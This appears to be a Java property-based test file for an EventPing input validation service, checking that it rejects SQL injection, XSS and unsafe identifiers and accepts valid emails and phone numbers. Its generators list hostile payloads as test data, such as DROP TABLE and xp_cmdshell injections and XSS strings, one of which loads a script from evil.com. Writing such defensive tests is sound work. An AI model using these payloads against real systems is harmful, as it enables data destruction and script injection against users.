package thomas.com.EventPing.security.service;

import net.jqwik.api.*;
import net.jqwik.api.lifecycle.BeforeProperty;
import org.junit.jupiter.api.DisplayName;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Property-based tests for InputValidationService
 * **Feature: eventping-security-hardening, Property 3: Input Validation Completeness**
 * **Validates: Requirements 2.1, 2.2, 2.3, 2.4**
 */
class InputValidationServicePropertyTest {

    private InputValidationService inputValidationService;

    @BeforeProperty
    void setUp() {
        inputValidationService = new InputValidationService();
    }

    @Property(tries = 100)
    @DisplayName("For any user input received by the system, all fields should be validated against their defined constraints and malicious patterns should be detected and rejected")
    void inputValidationCompletenessProperty(@ForAll("maliciousInputs") String maliciousInput) {
        // When: Validating potentially malicious input
        ValidationResult result = inputValidationService.validateInput(maliciousInput);
        
        // Then: Malicious input should be detected and rejected
        assertThat(result.isValid()).isFalse();
        assertThat(result.hasViolations()).isTrue();
        assertThat(result.getViolations()).isNotEmpty();
    }

    @Property(tries = 100)
    @DisplayName("For any SQL injection pattern, the system should detect and reject it")
    void sqlInjectionDetectionProperty(@ForAll("sqlInjectionPatterns") String sqlInjection) {
        // When: Checking for SQL injection
        boolean containsSqlInjection = inputValidationService.containsSqlInjection(sqlInjection);
        
        // Then: SQL injection should be detected
        assertThat(containsSqlInjection).isTrue();
    }

    @Property(tries = 100)
    @DisplayName("For any XSS pattern, the system should detect and reject it")
    void xssDetectionProperty(@ForAll("xssPatterns") String xssPattern) {
        // When: Checking for XSS
        boolean containsXss = inputValidationService.containsXss(xssPattern);
        
        // Then: XSS should be detected
        assertThat(containsXss).isTrue();
    }

    @Property(tries = 100)
    @DisplayName("For any valid email address, the system should accept it")
    void validEmailProperty(@ForAll("validEmails") String validEmail) {
        // When: Validating email
        boolean isValid = inputValidationService.isValidEmail(validEmail);
        
        // Then: Valid email should be accepted
        assertThat(isValid).isTrue();
    }

    @Property(tries = 100)
    @DisplayName("For any invalid email address, the system should reject it")
    void invalidEmailProperty(@ForAll("invalidEmails") String invalidEmail) {
        // When: Validating email
        boolean isValid = inputValidationService.isValidEmail(invalidEmail);
        
        // Then: Invalid email should be rejected
        assertThat(isValid).isFalse();
    }

    @Property(tries = 100)
    @DisplayName("For any safe identifier, the system should accept it")
    void safeIdentifierProperty(@ForAll("safeIdentifiers") String safeIdentifier) {
        // When: Validating identifier
        boolean isSafe = inputValidationService.isSafeIdentifier(safeIdentifier);
        
        // Then: Safe identifier should be accepted
        assertThat(isSafe).isTrue();
    }

    @Property(tries = 100)
    @DisplayName("For any unsafe identifier, the system should reject it")
    void unsafeIdentifierProperty(@ForAll("unsafeIdentifiers") String unsafeIdentifier) {
        // When: Validating identifier
        boolean isSafe = inputValidationService.isSafeIdentifier(unsafeIdentifier);
        
        // Then: Unsafe identifier should be rejected
        assertThat(isSafe).isFalse();
    }

    @Property(tries = 100)
    @DisplayName("For any input containing XSS, sanitization should remove dangerous content")
    void htmlSanitizationProperty(@ForAll("xssPatterns") String xssInput) {
        // When: Sanitizing HTML
        String sanitized = inputValidationService.sanitizeHtml(xssInput);
        
        // Then: Sanitized output should not contain XSS
        assertThat(inputValidationService.containsXss(sanitized)).isFalse();
    }

    @Property(tries = 100)
    @DisplayName("For any valid phone number, the system should accept it")
    void validPhoneNumberProperty(@ForAll("validPhoneNumbers") String phoneNumber) {
        // When: Validating phone number
        boolean isValid = inputValidationService.isValidPhoneNumber(phoneNumber);
        
        // Then: Valid phone number should be accepted
        assertThat(isValid).isTrue();
    }

    @Property(tries = 100)
    @DisplayName("For any clean input, validation should pass")
    void cleanInputProperty(@ForAll("cleanInputs") String cleanInput) {
        // When: Validating clean input
        ValidationResult result = inputValidationService.validateInput(cleanInput);
        
        // Then: Clean input should be valid
        assertThat(result.isValid()).isTrue();
        assertThat(result.hasViolations()).isFalse();
    }

    // Generators

    @Provide
    Arbitrary<String> maliciousInputs() {
        return Arbitraries.oneOf(
            sqlInjectionPatterns(),
            xssPatterns(),
            Arbitraries.strings().withChars('\0'), // Null bytes
            Arbitraries.strings().withChars((char) 1, (char) 8, (char) 11, (char) 12, (char) 14, (char) 31), // Control chars
            Arbitraries.strings().ofLength(10001) // Excessive length
        );
    }

    @Provide
    Arbitrary<String> sqlInjectionPatterns() {
        return Arbitraries.of(
            "SELECT * FROM users",
            "DROP TABLE users",
            "INSERT INTO users VALUES",
            "UPDATE users SET password",
            "DELETE FROM users WHERE",
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users;--",
            "admin'--",
            "' UNION SELECT * FROM users--",
            "1' OR '1'='1' /*",
            "x'; EXEC xp_cmdshell('dir');--",
            "'; EXEC sp_configure 'show advanced options', 1;--",
            "\\x27 OR \\x31\\x3D\\x31",
            "CHAR(65)+CHAR(66)",
            "CONCAT('A','B')",
            "SUBSTRING('test',1,1)"
        );
    }

    @Provide
    Arbitrary<String> xssPatterns() {
        return Arbitraries.of(
            "<script>alert('xss')</script>",
            "<script src='http://evil.com/xss.js'></script>",
            "<img src=x onerror=alert('xss')>",
            "<svg onload=alert('xss')>",
            "<iframe src='javascript:alert(\"xss\")'></iframe>",
            "<object data='javascript:alert(\"xss\")'></object>",
            "<embed src='javascript:alert(\"xss\")'></embed>",
            "<link rel='stylesheet' href='javascript:alert(\"xss\")'>",
            "<meta http-equiv='refresh' content='0;url=javascript:alert(\"xss\")'>",
            "<style>body{background:url('javascript:alert(\"xss\")')}</style>",
            "javascript:alert('xss')",
            "vbscript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            "onclick='alert(\"xss\")'",
            "onmouseover='alert(\"xss\")'",
            "onfocus='alert(\"xss\")'",
            "expression(alert('xss'))",
            "\\x3Cscript\\x3Ealert('xss')\\x3C/script\\x3E",
            "&#60;script&#62;alert('xss')&#60;/script&#62;",
            "&#x3C;script&#x3E;alert('xss')&#x3C;/script&#x3E;"
        );
    }

    @Provide
    Arbitrary<String> validEmails() {
        return Arbitraries.of(
            "user@example.com",
            "test.email@domain.org",
            "user+tag@example.co.uk",
            "firstname.lastname@company.com",
            "user123@test-domain.net",
            "admin@subdomain.example.com",
            "contact@example-site.org"
        );
    }

    @Provide
    Arbitrary<String> invalidEmails() {
        return Arbitraries.of(
            "invalid-email",
            "@example.com",
            "user@",
            "user..double.dot@example.com",
            "user@tempmail.com", // Suspicious domain
            "user@10minutemail.com", // Suspicious domain
            "user@guerrillamail.com", // Suspicious domain
            "user@mailinator.com", // Suspicious domain
            "user@throwaway.email", // Suspicious domain
            "user@.example.com",
            "user@example.",
            "user name@example.com", // Space in local part
            "user@ex ample.com" // Space in domain
        );
    }

    @Provide
    Arbitrary<String> safeIdentifiers() {
        return Arbitraries.of(
            "user123",
            "test-identifier",
            "safe_name",
            "ID_123",
            "user-profile-1",
            "event_2024",
            "category-A"
        );
    }

    @Provide
    Arbitrary<String> unsafeIdentifiers() {
        return Arbitraries.of(
            "user@domain", // Contains @
            "test identifier", // Contains space
            "user/path", // Contains /
            "test\\path", // Contains backslash
            "user<script>", // Contains HTML
            "test;drop", // Contains semicolon
            "user'or'1'='1", // SQL injection attempt
            "a".repeat(51), // Too long
            "", // Empty
            "user\0null", // Null byte
            "test\nline", // Newline
            "user\ttab" // Tab
        );
    }

    @Provide
    Arbitrary<String> validPhoneNumbers() {
        return Arbitraries.of(
            "+1234567890",
            "+12345678901",
            "+123456789012",
            "+1234567890123",
            "+12345678901234",
            "1234567890",
            "12345678901",
            "123456789012",
            "1234567890123",
            "12345678901234"
        );
    }

    @Provide
    Arbitrary<String> cleanInputs() {
        return Arbitraries.of(
            "Hello World",
            "This is a clean message",
            "User input without malicious content",
            "Simple text with numbers 123",
            "Clean input with punctuation!",
            "Normal user comment.",
            "Event description text",
            "User profile information"
        );
    }
}